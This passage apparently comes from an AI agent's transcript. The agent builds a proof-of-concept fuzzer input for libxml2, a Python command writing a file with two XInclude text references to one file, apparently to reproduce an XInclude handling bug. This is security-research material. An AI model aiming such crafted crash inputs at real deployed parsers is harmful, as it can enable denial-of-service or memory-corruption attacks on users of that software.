`XML_PARSE_XINCLUDE = 1<<10 = 1024 = 0x400`. Now let me create the PoC. The fuzzer format is:
1. 4 bytes: options (int, little-endian)
2. String pairs: URL followed by content, each terminated by `\\\n` (backslash newline)

The main document needs:
- Two XInclude elements with `parse="text"` referencing the same text file
- The text file needs to be defined as an entity

cd /workspace && python3 -c "
import struct
# Options: XML_PARSE_XINCLUDE = 1<<10 = 1024
opts = 1024
# Main document with two XInclude text references to the same file
main_doc = '''<?xml version=\"1.0\"?>
<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">
  <xi:include href=\"test.txt\" parse=\"text\"/>
  <xi:include href=\"test.txt\" parse=\"text\"/>
</root>'''
# The text file content
text_content = 'Hello World'
# Build the fuzz data
data = struct.pack('<I', opts)
# Write main doc
data += b'main.xml\\\\\n'
data += main_doc.encode() + b'\\\\\n'
# Write the text file
data += b'test.txt\\\\\n'
data += text_content.encode() + b'\\\\\n'
with open('/workspace/poc.bin', 'wb') as f:
    f.write(data)
print(f'PoC written: {len(data)} bytes')
print(repr(data))
